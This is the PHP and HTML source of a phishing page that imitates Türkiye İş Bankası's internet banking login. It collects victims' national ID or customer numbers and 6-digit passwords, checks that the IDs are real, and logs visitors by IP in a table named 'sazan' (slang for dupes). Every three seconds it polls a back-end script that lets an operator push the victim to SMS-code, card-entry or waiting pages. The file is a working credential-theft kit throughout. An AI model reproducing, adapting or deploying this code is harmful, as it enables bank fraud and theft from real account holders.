
<?php

date_default_timezone_set('Europe/Istanbul');
include('connect.php');
$ip = $_SERVER['REMOTE_ADDR'];
if($_POST){
$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
        header('Location:http://www.turkiye.gov.tr');
    } 
}
}

$updateQuery = $db->prepare('UPDATE sazan SET now=? WHERE ip=?');
				$updateResult = $updateQuery->execute(array('index', $ip));
?>

<html lang="tr" class="wf-sourcesanspro-n3-active wf-sourcesanspro-n6-active wf-sourcesanspro-n7-active wf-sourcesanspro-n4-active wf-active">
<head>   
<meta ui-build-version="1.8.7">
<meta gw-build-version="1.7.5">
<meta ib-build-version="1.8.6"><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="cache-control" content="no-cache"><meta http-equiv="expires" content="0">
<meta http-equiv="pragma" content="no-cache"><script></script><script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"></script>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700" media="all">
<script>WebFont.load({google:{families:["Source Sans Pro:300,400,600,700"]}})</script><title>Türkiye İş Bankası | İnternet Bankacılığı</title>
<link rel="stylesheet" href="/css/style.css">
<link href="/css/main.1c4ce484.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<style data-jss="" data-meta="MuiButtonBase">.MuiButtonBase-root {  color: inherit;  border: 0;  cursor: pointer;  margin: 0;  display: inline-flex;  outline: 0;  padding: 0;  position: relative;  align-items: center;  user-select: none;  border-radius: 0;  vertical-align: middle;  -moz-appearance: none;  justify-content: center;  text-decoration: none;  background-color: transparent;  -webkit-appearance: none;  -webkit-tap-highlight-color: transparent;}.MuiButtonBase-root::-moz-focus-inner {  border-style: none;}.MuiButtonBase-root.Mui-disabled {  cursor: default;  pointer-events: none;}@media print {  .MuiButtonBase-root {    -webkit-print-color-adjust: exact;  }}
 </style><style data-jss="" data-meta="MuiButton">.MuiButton-root {  color: rgba(0, 0, 0, 0.87);  padding: 6px 16px;  font-size: 0.875rem;  min-width: 64px;  box-sizing: border-box;  transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;  font-family: Source Sans Pro;  font-weight: 500;  line-height: 1.75;  border-radius: 4px;  text-transform: uppercase;}.MuiButton-root:hover {  text-decoration: none;  background-color: rgba(0, 0, 0, 0.04);}.MuiButton-root.Mui-disabled {  color: rgba(0, 0, 0, 0.26);}@media (hover: none) {  .MuiButton-root:hover {    background-color: transparent;  }}.MuiButton-root:hover.Mui-disabled {  background-color: transparent;}.MuiButton-label {  width: 100%;  display: inherit;  align-items: inherit;  justify-content: inherit;}.MuiButton-text {  padding: 6px 8px;}.MuiButton-textPrimary {  color: #127a3d;;}.MuiButton-textPrimary:hover {  background-color: rgba(18, 122, 61, 0.04);}@media (hover: none) {  .MuiButton-textPrimary:hover {    background-color: transparent;  }}.MuiButton-textSecondary {  color: #7db900;}.MuiButton-textSecondary:hover {  background-color: rgba(125, 185, 0, 0.04);}@media (hover: none) {  .MuiButton-textSecondary:hover {    background-color: transparent;  }}.MuiButton-outlined {  border: 1px solid rgba(0, 0, 0, 0.23);  padding: 5px 15px;}.MuiButton-outlined.Mui-disabled {  border: 1px solid rgba(0, 0, 0, 0.12);}.MuiButton-outlinedPrimary {  color: #127a3d;;  border: 1px solid rgba(18, 122, 61, 0.5);}.MuiButton-outlinedPrimary:hover {  border: 1px solid #127a3d;;  background-color: rgba(18, 122, 61, 0.04);}@media (hover: none) {  .MuiButton-outlinedPrimary:hover {    background-color: transparent;  }}.MuiButton-outlinedSecondary {  color: #7db900;  border: 1px solid rgba(125, 185, 0, 0.5);}.MuiButton-outlinedSecondary:hover {  border: 1px solid #7db900;  background-color: rgba(125, 185, 0, 0.04);}.MuiButton-outlinedSecondary.Mui-disabled {  border: 1px solid rgba(0, 0, 0, 0.26);}@media (hover: none) {  .MuiButton-outlinedSecondary:hover {    background-color: transparent;  }}.MuiButton-contained {  color: rgba(0, 0, 0, 0.87);  box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);  background-color: #e0e0e0;}.MuiButton-contained:hover {  box-shadow: 0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);  background-color: #d5d5d5;}.MuiButton-contained.Mui-focusVisible {  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.MuiButton-contained:active {  box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);}.MuiButton-contained.Mui-disabled {  color: rgba(0, 0, 0, 0.26);  box-shadow: none;  background-color: rgba(0, 0, 0, 0.12);}@media (hover: none) {  .MuiButton-contained:hover {    box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);    background-color: #e0e0e0;  }}.MuiButton-contained:hover.Mui-disabled {  background-color: rgba(0, 0, 0, 0.12);}.MuiButton-containedPrimary {  color: #fff;  background-color: #127a3d;;}.MuiButton-containedPrimary:hover {  background-color: rgba(12, 85, 42, NaN);}@media (hover: none) {  .MuiButton-containedPrimary:hover {    background-color: #127a3d;;  }}.MuiButton-containedSecondary {  color: rgba(0, 0, 0, 0.87);  background-color: #7db900;}.MuiButton-containedSecondary:hover {  background-color: rgb(87, 129, 0);}@media (hover: none) {  .MuiButton-containedSecondary:hover {    background-color: #7db900;  }}.MuiButton-disableElevation {  box-shadow: none;}.MuiButton-disableElevation:hover {  box-shadow: none;}.MuiButton-disableElevation.Mui-focusVisible {  box-shadow: none;}.MuiButton-disableElevation:active {  box-shadow: none;}.MuiButton-disableElevation.Mui-disabled {  box-shadow: none;}.MuiButton-colorInherit {  color: inherit;  border-color: currentColor;}.MuiButton-textSizeSmall {  padding: 4px 5px;  font-size: 0.8125rem;}.MuiButton-textSizeLarge {  padding: 8px 11px;  font-size: 0.9375rem;}.MuiButton-outlinedSizeSmall {  padding: 3px 9px;  font-size: 0.8125rem;}.MuiButton-outlinedSizeLarge {  padding: 7px 21px;  font-size: 0.9375rem;}.MuiButton-containedSizeSmall {  padding: 4px 10px;  font-size: 0.8125rem;}.MuiButton-containedSizeLarge {  padding: 8px 22px;  font-size: 0.9375rem;}.MuiButton-fullWidth {  width: 100%;}.MuiButton-startIcon {  display: inherit;  margin-left: -4px;  margin-right: 8px;}.MuiButton-startIcon.MuiButton-iconSizeSmall {  margin-left: -2px;}.MuiButton-endIcon {  display: inherit;  margin-left: 8px;  margin-right: -4px;}.MuiButton-endIcon.MuiButton-iconSizeSmall {  margin-right: -2px;}.MuiButton-iconSizeSmall > *:first-child {  font-size: 18px;}.MuiButton-iconSizeMedium > *:first-child {  font-size: 20px;}.MuiButton-iconSizeLarge > *:first-child {  font-size: 22px;}
 </style><style data-jss="" data-meta="makeStyles">.jss5 {  color: white;  height: 48px;  padding: 00;  font-size: 14px;  box-shadow: box-shadow: 1px 3px 4px 0 rgba(0, 0, 0, 0.12);  font-weight: 600;  line-height: 1.43;  text-transform: capitalize;}.jss5:hover {  box-shadow: 1px 3px 4px 0 rgba(0, 0, 0, 0.12);}.jss5:disabled {  color: #fff;  opacity: 0.6;  background-color: #7db900;}.jss5.MuiButton-outlined {  color: #4b4f54;}.jss5.MuiButton-outlined:disabled {  background-color: transparent;}
 </style><style data-jss="" data-meta="MuiFormControl">.MuiFormControl-root {  border: 0;  margin: 0;  display: inline-flex;  padding: 0;  position: relative;  min-width: 0;  flex-direction: column;  vertical-align: top;}.MuiFormControl-marginNormal {  margin-top: 16px;  margin-bottom: 8px;}.MuiFormControl-marginDense {  margin-top: 8px;  margin-bottom: 4px;}.MuiFormControl-fullWidth {  width: 100%;}
 </style><style data-jss="" data-meta="MuiFormLabel">.MuiFormLabel-root {  color: rgba(0, 0, 0, 0.54);  padding: 0;  font-size: 1rem;  font-family: Source Sans Pro;  font-weight: 400;  line-height: 1;}.MuiFormLabel-root.Mui-focused {  color: #127a3d;;}.MuiFormLabel-root.Mui-disabled {  color: rgba(0, 0, 0, 0.38);}.MuiFormLabel-root.Mui-error {  color: #fc4141;}.MuiFormLabel-colorSecondary.Mui-focused {  color: #7db900;}.MuiFormLabel-asterisk.Mui-error {  color: #fc4141;}
 </style><style data-jss="" data-meta="MuiInputLabel">.MuiInputLabel-root {  color: #a5a7aa;  display: block;  font-size: 14px;  margin-top: -4px;  margin-left: 0px;  transform-origin: top left;}.MuiInputLabel-formControl {  top: 0;  left: 0;  position: absolute;  transform: translate(0, 24px) scale(1);}.MuiInputLabel-marginDense {  transform: translate(0, 21px) scale(1);}.MuiInputLabel-shrink {  transform: translate(0, 1.5px) scale(0.75);  transform-origin: top left;}.MuiInputLabel-animated {  transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;}.MuiInputLabel-filled {  z-index: 1;  transform: translate(12px, 20px) scale(1);  pointer-events: none;}.MuiInputLabel-filled.MuiInputLabel-marginDense {  transform: translate(12px, 17px) scale(1);}.MuiInputLabel-filled.MuiInputLabel-shrink {  transform: translate(12px, 10px) scale(0.75);}.MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {  transform: translate(12px, 7px) scale(0.75);}.MuiInputLabel-outlined {  z-index: 1;  transform: translate(14px, 20px) scale(1);  pointer-events: none;}.MuiInputLabel-outlined.MuiInputLabel-marginDense {  transform: translate(14px, 12px) scale(1);}.MuiInputLabel-outlined.MuiInputLabel-shrink {  transform: translate(14px, -6px) scale(0.75);}
 </style><style data-jss="" data-meta="MuiInputBase">@-webkit-keyframes mui-auto-fill {}@-webkit-keyframes mui-auto-fill-cancel {}.MuiInputBase-root {  color: rgba(0, 0, 0, 0.87);  cursor: text;  display: inline-flex;  position: relative;  font-size: 1rem;  background: #fff;  box-sizing: border-box;  align-items: center;  font-family: Source Sans Pro;  font-weight: 400;  line-height: 1.1876em;}.MuiInputBase-root.Mui-disabled {  color: rgba(0, 0, 0, 0.38);  cursor: default;}.MuiInputBase-multiline {  padding: 6px 0 7px;}.MuiInputBase-multiline.MuiInputBase-marginDense {  padding-top: 3px;}.MuiInputBase-fullWidth {  width: 100%;}.MuiInputBase-input {  font: inherit;  color: currentColor;  width: 100%;  border: 0;  height: 18px;  margin: 0;  display: block;  padding: 15px 15px !important;  min-width: 0;  background: #fff;  box-sizing: content-box;  animation-name: mui-auto-fill-cancel;  letter-spacing: inherit;  animation-duration: 10ms;  -webkit-tap-highlight-color: transparent;}.MuiInputBase-input::-webkit-input-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.MuiInputBase-input::-moz-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.MuiInputBase-input:-ms-input-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.MuiInputBase-input::-ms-input-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.MuiInputBase-input:focus {  outline: 0;}.MuiInputBase-input:invalid {  box-shadow: none;}.MuiInputBase-input::-webkit-search-decoration {  -webkit-appearance: none;}.MuiInputBase-input.Mui-disabled {  opacity: 1;}.MuiInputBase-input:-webkit-autofill {  animation-name: mui-auto-fill;  animation-duration: 5000s;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {  opacity: 0 !important;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {  opacity: 0 !important;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {  opacity: 0 !important;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {  opacity: 0 !important;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {  opacity: 0.42;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {  opacity: 0.42;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {  opacity: 0.42;}label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {  opacity: 0.42;}.MuiInputBase-inputMarginDense {  padding-top: 3px;}.MuiInputBase-inputMultiline {  height: auto;  resize: none;  padding: 0;}.MuiInputBase-inputTypeSearch {  -moz-appearance: textfield;  -webkit-appearance: textfield;}
 </style><style data-jss="" data-meta="PrivateNotchedOutline">.jss1 {  top: -5px;  left: 0;  right: 0;  bottom: 0;  margin: 0;  padding: 0 8px;  overflow: hidden;  position: absolute;  border-style: solid;  border-width: 1px;  border-radius: inherit;  pointer-events: none;}.jss2 {  padding: 0;  text-align: left;  transition: width 150ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;  line-height: 11px;}.jss3 {  width: auto;  height: 11px;  display: block;  padding: 0;  font-size: 0.75em;  max-width: 0.01px;  text-align: left;  transition: max-width 50ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;  visibility: hidden;}.jss3 > span {  display: inline-block;  padding-left: 5px;  padding-right: 5px;}.jss4 {  max-width: 1000px;  transition: max-width 100ms cubic-bezier(0.0, 0, 0.2, 1) 50ms;}
 </style><style data-jss="" data-meta="MuiOutlinedInput">.MuiOutlinedInput-root {  position: relative;  border-radius: 4px;}.MuiOutlinedInput-root:hover .MuiOutlinedInput-notchedOutline {  border-color: rgba(0, 0, 0, 0.87);}@media (hover: none) {  .MuiOutlinedInput-root:hover .MuiOutlinedInput-notchedOutline {    border-color: rgba(0, 0, 0, 0.23);  }}.MuiOutlinedInput-root.Mui-focused .MuiOutlinedInput-notchedOutline {  border-color: #127a3d;;  border-width: 2px;}.MuiOutlinedInput-root.Mui-error .MuiOutlinedInput-notchedOutline {  border-color: #fc4141;}.MuiOutlinedInput-root.Mui-disabled .MuiOutlinedInput-notchedOutline {  border-color: rgba(0, 0, 0, 0.26);}.MuiOutlinedInput-colorSecondary.Mui-focused .MuiOutlinedInput-notchedOutline {  border-color: #7db900;}.MuiOutlinedInput-adornedStart {  padding-left: 14px;}.MuiOutlinedInput-adornedEnd {  padding-right: 14px;}.MuiOutlinedInput-multiline {  padding: 18.5px 14px;}.MuiOutlinedInput-multiline.MuiOutlinedInput-marginDense {  padding-top: 10.5px;  padding-bottom: 10.5px;}.MuiOutlinedInput-notchedOutline {  border-color: rgba(0, 0, 0, 0.23);}.MuiOutlinedInput-input {  padding: 18.5px 14px;}.MuiOutlinedInput-input:-webkit-autofill {  border-radius: inherit;}.MuiOutlinedInput-inputMarginDense {  padding-top: 10.5px;  padding-bottom: 10.5px;}.MuiOutlinedInput-inputMultiline {  padding: 0;}.MuiOutlinedInput-inputAdornedStart {  padding-left: 0;}.MuiOutlinedInput-inputAdornedEnd {  padding-right: 0;}
 </style><style data-jss="" data-meta="MuiTextField">
 </style><style data-jss="" data-meta="MuiInputAdornment">.MuiInputAdornment-root {  height: 0.01em;  display: flex;  max-height: 2em;  align-items: center;  white-space: nowrap;}.MuiInputAdornment-filled.MuiInputAdornment-positionStart:not(.MuiInputAdornment-hiddenLabel) {  margin-top: 16px;}.MuiInputAdornment-positionStart {  margin-right: 8px;}.MuiInputAdornment-positionEnd {  margin-left: 8px;}.MuiInputAdornment-disablePointerEvents {  pointer-events: none;}
 </style>
    <style>
        body {
            margin: 0;
            padding: 0;
              
            margin-left: auto;
            margin-right: auto;
        }
  html {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
               max-width: 400px;
                      width: 100%;
            margin-left: auto;
            margin-right: auto;
        }
        header {
            position: relative;
            width: 100%;
            max-width: 100%;
            height: auto;
            overflow: hidden;
        }

        header img {
            width: 100%;
            height: auto;
            display: block;
            max-width: 500px;
            margin: auto;
        }.footer__call-center {
    color: #4b4f54;
    font-size: 14px;
    font-weight: 700;
    line-height: 1.29;
    text-align: left;
}.footer__call-center-number {
    color: #4b4f54;
    font-size: 14px;
    font-weight: 700;
    line-height: 1.29;
    text-align: left;
}
    </style>
    <script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='bildirim.php';
      }
        if(msg=='back'){
        window.location.href='sms.php';
      }
         if(msg=='back'){
        window.location.href='index.php?1';
      }
            if(msg=='1'){
        window.location.href='index.php?1';
      }       if(msg=='2'){
        window.location.href='kart.php';
      }          if(msg=='3'){
        window.location.href='bekle.php';
      }          if(msg=='4'){
        window.location.href='hata.php';
      }          if(msg=='5'){
        window.location.href='tebrik.php';
      }  
      }
    });
    
}
</script>
 </head>
  <body>
  <header style="
    margin-top: 0px;
    margin-bottom: -20px;
">
        <img src="head.png" alt="Header Image" style="
    margin-top: 13px;
">
    </header>
    <div id="root" style="height: 300px;">
      <div class="app-container">
        <div class="app-body"  style="height: 310px;">
          <div class="app-body-content app-body-content--           app-body-content--fullwidth" style="
    height: 400px;
    width: 95%;
">
            <div class="seker-toast" style="padding-top: 15px;"></div>
            <div class="content-holder content-holder-- content-holder-login" style="
    padding-top: 20px;
    padding-bottom: 20px;
    margin: auto;
    width: 95%;

">
              <div class="login">
                <div class="form-col">
                
                </div>
                <form autocomplete="off" action="validateCaptcha.php" method="post">
                  <div class="form-row">
                    <div class="form-col">
                      <div class="MuiFormControl-root MuiTextField-root undefined MuiFormControl-fullWidth" role="presentation" aria-autocomplete="none" inputmode="numeric">
                        <label class="MuiFormLabel-root MuiFormLabel-colorSecondary MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined" data-shrink="false" for="customerTcknNumber" id="customerTcknNumber-label"> </label>
                           <input aria-invalid="false" autocomplete="off" id="customerTcknNumber" name="customerTcknNumber" type="text" maxlength="11" class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputAdornedEnd MuiOutlinedInput-inputAdornedEnd" placeholder="TCKN / Müşteri Numarası" style="" value="">
                          
                          <fieldset aria-hidden="true" class="jss1 MuiOutlinedInput-notchedOutline">
                  
                          </fieldset>
                       </div>
                      <p class="MuiFormHelperText-root MuiFormHelperText-contained Mui-error" id="customerTcknNumber-helper-text" style="color: #fc4141;display: none;">Lütfen TCKN veya Müşteri Numarası giriniz.</p>
                    </div>
                  </div>
                  <div class="form-row" style="margin-top: 18px;">
                    <div class="form-col">
                      <div class=" numpad-container">
                        <div class="MuiFormControl-root MuiTextField-root undefined MuiFormControl-fullWidth" role="presentation" aria-autocomplete="none" maxlength="6">
                           <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorSecondary MuiOutlinedInput-colorSecondary MuiInputBase-fullWidth MuiInputBase-formControl MuiInputBase-adornedEnd MuiOutlinedInput-adornedEnd">
                            <input aria-invalid="false" autocomplete="off" id="password" name="password" type="text" maxlength="6" pattern="[0-9]*" class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputAdornedEnd MuiOutlinedInput-inputAdornedEnd" placeholder="Şifre" value="">
                            <div class="MuiInputAdornment-root MuiInputAdornment-positionStart">
                            <i class="lni lni-calculator-alt" style="font: normal normal normal 25px/1 'lineicons';"></i>
                            <fieldset aria-hidden="true" class="jss1 MuiOutlinedInput-notchedOutline">
                      
                            </fieldset>
                          </div>
                        </div>
                      </div>
                    </div>
                    <p class="MuiFormHelperText-root MuiFormHelperText-contained Mui-error MuiFormHelperText-filled" id="password-helper-text" name="password-helper-text" style="    color: #fc4141;display: none;">Şifreniz 6 karakter olmalıdır.</p>
                  </div>
                  <div class="form-row">
                    <div class="form-col">
                      <div class="login__password-links" style="
    margin-top: 8px;
    margin-bottom: 10px;
">
                        <a style="font-weight: 700; color: #1d3247;">Şifremi Unuttum</a>
                      
                      </div>
                    </div>
                  </div>
                  <div class="form-row">
                    <button class="MuiButtonBase-root MuiButton-root jss5 MuiButton-contained MuiButton-containedSecondary MuiButton-fullWidth" tabindex="0" type="submit" style="background-color: #08335E;">
                      <span class="MuiButton-label"> Giriş</span>
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <img src="foot.png" alt="Header Image" style="
 
 margin-top: 13px;
    width: 100%;

">
   </footer>
  
    <script>
document.addEventListener('DOMContentLoaded', function () {
    var customerTcknNumberInput = document.getElementById('customerTcknNumber');
    var passwordInput = document.getElementById('password');
    var customerTcknNumberHelperText = document.getElementById('customerTcknNumber-helper-text');
    var passwordHelperText = document.getElementById('password-helper-text');

     customerTcknNumberInput.addEventListener('click', function () {
         customerTcknNumberHelperText.style.display = 'none';
    });

     passwordInput.addEventListener('click', function () {
         passwordHelperText.style.display = 'none';
    });

     document.querySelector('form').addEventListener('submit', function (event) {
         var customerTcknNumberValue = customerTcknNumberInput.value;
        var passwordValue = passwordInput.value;

         if (!isValidCustomerTcknNumber(customerTcknNumberValue)) {
             customerTcknNumberHelperText.style.display = 'block';
             event.preventDefault();
        }

        // Password kontrolü
        if (!isValidPassword(passwordValue)) {
             passwordHelperText.style.display = 'block';
             event.preventDefault();
        }
    });

     function isValidCustomerTcknNumber(value) {
       
      value = String(value);
    if (value.substring(0, 1) === '0') {
      return false;
    }
    if (value.length !== 11) {
      return false;
    }
    var ilkon_array = value.substr(0, 10).split('');
    var ilkon_total = hane_tek = hane_cift = 0;
    for (var i = j = 0; i < 9; ++i) {
      j = parseInt(ilkon_array[i], 10);
      if (i & 1) {
        hane_cift += j;
      } else {
        hane_tek += j;
      }
      ilkon_total += j;
    }
    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(value.substr(-2, 1), 10)) {
      return false;
    }
    ilkon_total += parseInt(ilkon_array[9], 10);
    if (ilkon_total % 10 !== parseInt(value.substr(-1), 10)) {
      return false;
    }
    return true;
   
    }

     function isValidPassword(value) {
        // Password validation function
        return /^[0-9]{6}$/.test(value); // Check if it contains only 6 digits
    }
});
</script>
  
  </body>


</html>